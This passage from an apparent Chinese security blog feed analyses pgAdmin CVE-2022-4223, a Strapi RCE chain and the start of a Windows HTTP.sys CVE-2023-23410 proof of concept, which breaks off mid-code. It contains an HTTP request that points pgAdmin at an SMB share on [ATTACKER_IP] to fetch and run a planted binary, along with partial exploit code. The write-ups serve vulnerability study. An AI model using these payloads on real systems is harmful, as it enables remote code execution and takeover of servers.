style="color:#ae81ff">https://[TARGETHOST]/browser/</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">[n]</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">application/json</span></span></span><span style="display:flex;"><span>{"utility_path"<span style="color:#f92672">:</span><span style="color:#ae81ff">"\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]"}</span></span></span></code></pre></div><p><strong>分析</strong>
在<code>validate_binary_path</code>路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的<code>utility_path</code>，这个函数接收<code>utility_path</code>并使用<code>os.path.abspath(os.path.join</code>拼接路径，而<code>os.path.join</code>可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有<code>pg_dump.exe</code>，传入UNC路径，pgadmin就会获取到这个文件并执行，导致代码执行。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@blueprint.route</span>(<span style="color:#e6db74">"/validate_binary_path"</span>,</span></span><span style="display:flex;"><span> endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">"validate_binary_path"</span>,</span></span><span style="display:flex;"><span> methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">"POST"</span>])<span style="color:#75715e"># [1]</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">validate_binary_path</span>():</span></span><span style="display:flex;"><span><span style="color:#e6db74">"""</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> This function is used to validate the specified utilities path by</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> running the utilities with there versions.</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> """</span></span></span><span style="display:flex;"><span> data<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> hasattr(request<span style="color:#f92672">.</span>data,<span style="color:#e6db74">'decode'</span>):</span></span><span style="display:flex;"><span> data<span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">'utf-8'</span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> data<span style="color:#f92672">!=</span><span style="color:#e6db74">''</span>:</span></span><span style="display:flex;"><span> data<span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(data)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> version_str<span style="color:#f92672">=</span><span style="color:#e6db74">''</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#e6db74">'utility_path'</span><span style="color:#f92672">in</span> data<span style="color:#f92672">and</span> data[<span style="color:#e6db74">'utility_path'</span>]<span style="color:#f92672">is</span><span style="color:#f92672">not</span><span style="color:#66d9ef">None</span>:<span style="color:#75715e"># [2]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if "$DIR" present in binary path</span></span></span><span style="display:flex;"><span> binary_path<span style="color:#f92672">=</span> replace_binary_path(data[<span style="color:#e6db74">'utility_path'</span>])<span style="color:#75715e"># [3]</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> utility<span style="color:#f92672">in</span> UTILITIES_ARRAY:<span style="color:#75715e"># [4]</span></span></span><span style="display:flex;"><span> full_path<span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(</span></span><span style="display:flex;"><span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(binary_path,</span></span><span style="display:flex;"><span> (utility<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>name<span style="color:#f92672">!=</span><span style="color:#e6db74">'nt'</span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> (utility<span style="color:#f92672">+</span><span style="color:#e6db74">'.exe'</span>))))<span style="color:#75715e"># [5]</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the output of the '--version' command</span></span></span><span style="display:flex;"><span> version_string<span style="color:#f92672">=</span> \</span></span><span style="display:flex;"><span> subprocess<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">'"</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">" --version'</span><span style="color:#f92672">.</span>format(full_path))<span style="color:#75715e"># [6]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the version number by splitting the result string</span></span></span><span style="display:flex;"><span> version_string<span style="color:#f92672">.</span>split(<span style="color:#e6db74">") "</span>,<span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">'.'</span>,<span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>]</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span></span></span></code></pre></div><p><strong>补丁</strong>
补丁中增加了身份验证，并且在拼接路径时使用os.path.exists检查是否存在，不存在则报错。</p><p><img alt="" src="/images/vulnerability/CVE-2022-4223-PgAdmin-RCE.zh-cn.assets/patch.png"/></p><h3 id="小结">小结</h3><p>这个漏洞原理较为简单，python的函数可以接收UNC路径，而开发者并未考虑到这一点，导致可以传入UNC路径达成远程代码执行。值得注意的是这个漏洞是靠codeql审计出来的。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html" target="_blank">https://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html</a></p></blockquote><p><strong>Created at 2023-05-08T14:18:21+08:00</strong></p></description></item><item><title>Strapi RCE 漏洞链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</link><pubDate>Fri, 05 May 2023 21:06:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>该漏洞利用链由两个漏洞组成：Strapi 远程代码执行漏洞(CVE-2023-22621)和Strapi 信息泄露漏洞(CVE-2023-22894)</p><p>Strapi 远程代码执行漏洞(CVE-2023-22621)为后台SSTI模板注入，在Strapi管理面板的Users &amp; Permissions plugin可以设置确认邮件模板，在模板处存在模板注入，当开启邮件确认选项时将渲染该模板，触发漏洞，利用该漏洞需要后台管理员权限，以修改模板。</p><p>Strapi 信息泄露漏洞(CVE-2023-22894)，Strapi 信息泄露漏洞(CVE-2023-22894)是由于Strapi在查询时，只是在查询结果中删除了敏感字段，在实际查询语句中仍然可以使用该敏感字段，所以攻击者可以通过观察Strapi服务端返回的数据，猜测所输入的敏感字段是否正确，即攻击者可以通过暴力破解，将敏感字段爆破出来</p><h3 id="影响版本">影响版本</h3><pre tabindex="0"><code>Strapi ≤ 4.5.5</code></pre><h3 id="环境搭建">环境搭建</h3><p>参考<a href="https://razinj.dev/how-to-run-strapi-4-in-a-docker-container-using-docker-compose/" target="_blank">https://razinj.dev/how-to-run-strapi-4-in-a-docker-container-using-docker-compose/</a>，使用<code>npx create-strapi-app@4.5.5 app</code> 命令启动<code>strapi v4.5.5</code>并且用<code>docker</code>起数据库。</p><p>docker-compose.yml:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">version</span>:<span style="color:#e6db74">'3'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">postgres</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">image</span>:<span style="color:#ae81ff">postgres</span></span></span><span style="display:flex;"><span><span style="color:#f92672">restart</span>:<span style="color:#ae81ff">always</span></span></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:</span></span><span style="display:flex;"><span> -<span style="color:#ae81ff">pgdata:/var/lib/postgresql/data</span></span></span><span style="display:flex;"><span><span style="color:#f92672">environment</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">POSTGRES_USER</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">POSTGRES_PASSWORD</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">POSTGRES_DB</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">ports</span>:</span></span><span style="display:flex;"><span> -<span style="color:#e6db74">'5432:5432'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">mysql</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">image</span>:<span style="color:#ae81ff">mysql:5</span></span></span><span style="display:flex;"><span><span style="color:#f92672">restart</span>:<span style="color:#ae81ff">always</span></span></span><span style="display:flex;"><span><span style="color:#f92672">command</span>: --<span style="color:#ae81ff">default-authentication-plugin=mysql_native_password</span></span></span><span style="display:flex;"><span><span style="color:#f92672">environment</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">MYSQL_DATABASE</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">MYSQL_USER</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">MYSQL_PASSWORD</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">MYSQL_ROOT_HOST</span>:<span style="color:#e6db74">'%'</span></span></span><span style="display:flex;"><span><span style="color:#f92672">MYSQL_ROOT_PASSWORD</span>:<span style="color:#ae81ff">strapi</span></span></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:</span></span><span style="display:flex;"><span> -<span style="color:#ae81ff">mysqldata:/var/lib/mysql</span></span></span><span style="display:flex;"><span><span style="color:#f92672">ports</span>:</span></span><span style="display:flex;"><span> -<span style="color:#e6db74">'3306:3306'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">pgdata</span>:</span></span><span style="display:flex;"><span><span style="color:#f92672">mysqldata</span>:</span></span></code></pre></div><p>由于strapi监听在localhost，通过ssh把1337端口转发出来</p><pre tabindex="0"><code>ssh -CfNg -L 127.0.0.1:1337:127.0.0.1:1337 [root@192.168.59.197]</code></pre><h3 id="技术分析调试">技术分析&amp;调试</h3><p>该漏洞利用链由两个漏洞组成，分别是Strapi 远程代码执行漏洞(CVE-2023-22621)和Strapi 信息泄露漏洞(CVE-2023-22894)。</p><p>Strapi 远程代码执行漏洞(CVE-2023-22621)是由服务端模板注入导致，在Strapi的管理面板的Users &amp; Permissions plugin可以设置确认邮件模板，该模板由lodash 模板引擎渲染，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#e6db74">'use strict'</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">_</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">'lodash'</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">getProviderSettings</span><span style="color:#f92672">=</span> () => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">strapi</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">'plugin.email'</span>);</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">send</span><span style="color:#f92672">=</span><span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">options</span>) => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">strapi</span>.<span style="color:#a6e22e">plugin</span>(<span style="color:#e6db74">'email'</span>).<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">options</span>);</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * fill subject, text and html using lodash template</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @param {object} emailOptions - to, from and replyto...</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @param {object} emailTemplate - object containing attributes to fill</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @param {object} data - data used to fill the template</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @returns {{ subject, text, subject }}</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">sendTemplatedEmail</span><span style="color:#f92672">=</span> (<span style="color:#a6e22e">emailOptions</span><span style="color:#f92672">=</span> {},<span style="color:#a6e22e">emailTemplate</span><span style="color:#f92672">=</span> {},<span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> {}) => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">attributes</span><span style="color:#f92672">=</span> [<span style="color:#e6db74">'subject'</span>,<span style="color:#e6db74">'text'</span>,<span style="color:#e6db74">'html'</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">missingAttributes</span><span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>.<span style="color:#a6e22e">difference</span>(<span style="color:#a6e22e">attributes</span>, Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">emailTemplate</span>));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">missingAttributes</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">></span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> Error(</span></span><span style="display:flex;"><span><span style="color:#e6db74">`Following attributes are missing from your email template :</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">missingAttributes</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">', '</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span></span></span><span style="display:flex;"><span> );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">templatedAttributes</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attributes</span>.<span style="color:#a6e22e">reduce</span>(</span></span><span style="display:flex;"><span> (<span style="color:#a6e22e">compiled</span>,<span style="color:#a6e22e">attribute</span>) =></span></span><span style="display:flex;"><span><span style="color:#a6e22e">emailTemplate</span>[<span style="color:#a6e22e">attribute</span>]</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span> Object.<span style="color:#a6e22e">assign</span>(<span style="color:#a6e22e">compiled</span>, { [<span style="color:#a6e22e">attribute</span>]<span style="color:#f92672">:</span><span style="color:#a6e22e">_</span>.<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">emailTemplate</span>[<span style="color:#a6e22e">attribute</span>])(<span style="color:#a6e22e">data</span>) })</span></span><span style="display:flex;"><span><span style="color:#f92672">:</span><span style="color:#a6e22e">compiled</span>,</span></span><span style="display:flex;"><span> {}</span></span><span style="display:flex;"><span> );</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">strapi</span>.<span style="color:#a6e22e">plugin</span>(<span style="color:#e6db74">'email'</span>).<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>({ ...<span style="color:#a6e22e">emailOptions</span>, ...<span style="color:#a6e22e">templatedAttributes</span> });</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span><span style="color:#f92672">=</span> () => ({</span></span><span style="display:flex;"><span><span style="color:#a6e22e">getProviderSettings</span>,</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send</span>,</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sendTemplatedEmail</span>,</span></span><span style="display:flex;"><span>});</span></span></code></pre></div><p>该段代码获取模板及输入内容，调用_.template(emailTemplate[attribute])(data) })渲染内容， 在此之前，渲染内容由如下代码进行校验，以避免危险内容渲染：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#e6db74">'use strict'</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">_</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">'lodash'</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">invalidPatternsRegexes</span><span style="color:#f92672">=</span> [<span style="color:#e6db74">/&lt;%[^=]([^&lt;>%]*)%>/m</span>,<span style="color:#e6db74">/\${([^{}]*)}/m</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">authorizedKeys</span><span style="color:#f92672">=</span> [</span></span><span style="display:flex;"><span><span style="color:#e6db74">'URL'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'ADMIN_URL'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'SERVER_URL'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'CODE'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'USER'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'USER.email'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'USER.username'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'TOKEN'</span>,</span></span><span style="display:flex;"><span>];</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">matchAll</span><span style="color:#f92672">=</span> (<span style="color:#a6e22e">pattern</span>,<span style="color:#a6e22e">src</span>) => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">matches</span><span style="color:#f92672">=</span> [];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span><span style="color:#a6e22e">match</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">regexPatternWithGlobal</span><span style="color:#f92672">=</span> RegExp(<span style="color:#a6e22e">pattern</span>,<span style="color:#e6db74">'g'</span>);</span></span><span style="display:flex;"><span><span style="color:#75715e">// eslint-disable-next-line no-cond-assign</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">while</span> ((<span style="color:#a6e22e">match</span><span style="color:#f92672">=</span><span style="color:#a6e22e">regexPatternWithGlobal</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">src</span>))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> [,<span style="color:#a6e22e">group</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">match</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">matches</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">_</span>.<span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">group</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">matches</span>;</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">isValidEmailTemplate</span><span style="color:#f92672">=</span> (<span style="color:#a6e22e">template</span>) => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span><span style="color:#a6e22e">reg</span><span style="color:#66d9ef">of</span><span style="color:#a6e22e">invalidPatternsRegexes</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reg</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">template</span>)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">matches</span><span style="color:#f92672">=</span><span style="color:#a6e22e">matchAll</span>(<span style="color:#e6db74">/&lt;%=([^&lt;>%=]*)%>/</span>,<span style="color:#a6e22e">template</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span><span style="color:#a6e22e">match</span><span style="color:#66d9ef">of</span><span style="color:#a6e22e">matches</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">authorizedKeys</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">match</span>)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span><span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">isValidEmailTemplate</span>,</span></span><span style="display:flex;"><span>};</span></span></code></pre></div><p>该代码使用正则表达式检查邮件模板是否有非法内容，但由于正则表达式错误，导致攻击者可以使用排除列表的字符绕过检查，利用lodash的模板注入，向模板内注入恶意nodejs代码，当新注册用户时，Strapi将读取模板内容并渲染，从而导致代码执行。</p><p>Strapi 信息泄露漏洞(CVE-2023-22894)是由于Strapi在查询时，只是在查询结果中删除了敏感字段，在实际查询语句中仍然可以使用该敏感字段，所以攻击者可以通过观察Strapi服务端返回的数据，猜测所输入的敏感字段是否正确，即攻击者可以通过暴力破解，将敏感字段爆破出来，以上利用需要一定权限。当Strapi存在管理员创建的collection时，其关系字段会映射到管理员用户，如果该collection被配置为允许未授权用户访问，则未授权攻击者可以利用该collection访问Strapi管理员用户的密码哈希和重置密码token。</p><p><img alt="" src="/images/vulnerability/Strapi-RCE.zh-cn.assets/1.png"/></p><p>结合两个漏洞，攻击者可以利用Strapi 信息泄露漏洞(CVE-2023-22894)爆破得到管理员用户的邮箱，之后发送重置密码请求，在通过信息泄露获取到重置密码token，通过该token强制重置管理员密码并得到管理面板访问权限，之后利用Strapi 远程代码执行漏洞(CVE-2023-22621)向邮件模板里面注入恶意代码，在注册用户触发漏洞，执行恶意nodejs代码。</p><p><img alt="" src="/images/vulnerability/Strapi-RCE.zh-cn.assets/2.png"/></p><p>PoC</p><pre tabindex="0"><code>https://github.com/Chestnuts4/POC</code></pre><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471" target="_blank">https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471</a></p><p><a href="https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf" target="_blank">https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf</a><a href="https://strapi.io/blog/security-disclosure-of-vulnerabilities-cve" target="_blank">https://strapi.io/blog/security-disclosure-of-vulnerabilities-cve</a></p></blockquote><p><strong>Created at 2023-05-05T21:06:55+08:00</strong></p></description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description><h3 id="基本信息">基本信息</h3><p>在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。</p><h3 id="环境搭建">环境搭建</h3><ul><li>操作系统 windows 10</li><li>调试器 windbg</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _WIN32_WINNT 0x0A00</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SECURITY_WIN32</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;http.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;sspi.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;strsafe.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma warning(disable : 4127)</span><span style="color:#75715e">// condition expression is constant</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#66d9ef">__cdecl</span><span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#a6e22e">__in_ecount</span>(argc)<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>argv[]) {</span></span><span style="display:flex;"><span> HANDLE hReqQueue<span style="color:#f92672">=</span> NULL;</span></span><span style="display:flex;"><span> HTTPAPI_VERSION HttpApiVersion<span style="color:#f92672">=</span> HTTPAPI_VERSION_2;</span></span><span style="display:flex;"><span> HTTP_SERVER_SESSION_ID ssID<span style="color:#f92672">=</span> HTTP_NULL_ID;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ULONG retCode;</span></span><span style="display:flex;"><span> HTTP_URL_GROUP_ID urlGroupId<span style="color:#f92672">=</span> HTTP_NULL_ID;</span></span><span style="display:flex;"><span><span style="color:#75715e">// 初始化HTTP服务器驱动</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpInitialize</span>(HttpApiVersion,</span></span><span style="display:flex;"><span> HTTP_INITIALIZE_SERVER,<span style="color:#75715e">// Flags</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> NULL<span style="color:#75715e">// Reserved</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> );</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (retCode<span style="color:#f92672">!=</span> NO_ERROR) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"HttpInitialize failed with %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, retCode);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> retCode;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">// 创建服务会话</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpCreateServerSession</span>(HttpApiVersion,<span style="color:#f92672">&amp;</span>ssID,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (retCode<span style="color:#f92672">!=</span> NO_ERROR) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"HttpCreateServerSession failed with %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, retCode);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">// 创建url group</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpCreateUrlGroup</span>(ssID,<span style="color:#f92672">&amp;</span>urlGroupId,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (retCode<span style="color:#f92672">!=</span> NO_ERROR) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"HttpCreateUrlGroup failed with %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, retCode);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> BYTE data_temp1[<span style="color:#ae81ff">0x1000</span>]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};</span></span><span style="display:flex;"><span> DWORD return_len<span style="color:#f92672">=</span><span 